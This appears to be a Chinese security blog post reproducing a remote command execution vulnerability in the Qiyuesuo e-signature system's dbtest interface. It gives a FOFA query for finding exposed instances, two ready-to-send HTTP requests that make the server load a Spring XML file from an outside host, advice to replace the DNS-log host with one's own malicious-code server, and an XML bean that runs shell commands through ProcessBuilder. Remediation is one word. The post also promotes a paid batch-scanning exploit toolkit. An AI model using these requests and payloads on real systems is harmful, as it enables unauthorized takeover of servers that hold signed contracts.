> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247488643&idx=1&sn=b27e3aba1632dd12bad93e6c83fe107a

#  契约锁电子签章系统dbtest接口存在远程命令执行漏洞 附POC  
2025-6-18更新  南风漏洞复现文库   2025-06-18 15:44  
  
   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 契约锁电子签章系统简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
契约锁电子签章系统  
## 2.漏洞描述  
  
契约锁电子签章系统dbtest接口存在远程命令执行漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
契约锁电子签章系统  
  
![契约锁电子签章系统dbtest接口存在远程命令执行漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3Yq1Uqh5QWY0KktonmgF2opZQwHXCaibzIReQH3FUqrejPibPPKbt0PrNmXt237elY1QlzYwBKtEEicw/640?wx_fmt=png&from=appmsg "null")  
  
契约锁电子签章系统dbtest接口存在远程命令执行漏洞  
## 4.fofa查询语句  
  
app="契约锁-电子签署平台"  
## 5.漏洞复现  
  
漏洞数据包如下两个：  

```
GET /api/setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fdxugqgrfejgjdekb.2bi2sq.dnslog.cn%2F1%2Exml HTTP/1.1Host: xx.xx.xx.xxxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*Connection: Keep-Alive
```


```
GET /setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fdxugqgrfejgjdekb.2bi2sq.dnslog.cn%2F1%2Exml HTTP/1.1Host: xx.xx.xx.xxxUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*Connection: Keep-Alive
```

  
存在漏洞会成功出发dnslog平台记录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yq1Uqh5QWY0KktonmgF2op6jZx447PHTeDfx0dMmpfWoLTFSv345QibMYHvh6ic8AugWmicGzwFOdMA/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
可以在把dnslog替换成自己的恶意代码地址，在自己的网站上搭建如下文件，用接口访问该文件即可：  

```
<beans xmlns=&#34;http://www.springframework.org/schema/beans&#34;       xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;       xmlns:p=&#34;http://www.springframework.org/schema/p&#34;       xsi:schemaLocation=&#34;http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd&#34;>   <bean id=&#34;exec&#34; class=&#34;java.lang.ProcessBuilder&#34; init-method=&#34;start&#34;>        <constructor-arg>          <list>            <value>/bin/sh</value>            <value>-c</value>            <value>touch /tmp/test</value>          </list>        </constructor-arg>    </bean></beans>
```

## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yq1Uqh5QWY0KktonmgF2op1FIgBibg2cEp3BA7WYp7PrQReYtaPf0Px5dUoNmBicC1TXe75zIxGp6Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yq1Uqh5QWY0KktonmgF2op3yzibXsDBgKhVcHOxzDycCW8rK6dbCOg1MCWaHAsT5gV5R7E5GHiabtg/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yq1Uqh5QWY0KktonmgF2opYnEnqJOKu7WcPj6UutydpNESnTDkDrphK4zqOia5CWPkecjjLzWEY0w/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yq1Uqh5QWY0KktonmgF2opRtmSqDoX2hOXOrafqLtd0Vk2QggJCPqvvp4MGAlGADUhYvIthibGpPQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yq1Uqh5QWY0KktonmgF2opRELQ1qSmBicibvf15gUARDTaSoKdia8nKiaZJWJ63tuoibbzNiaA5z6YuWuA/640?wx_fmt=jpeg&from=appmsg "null")  
  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
  
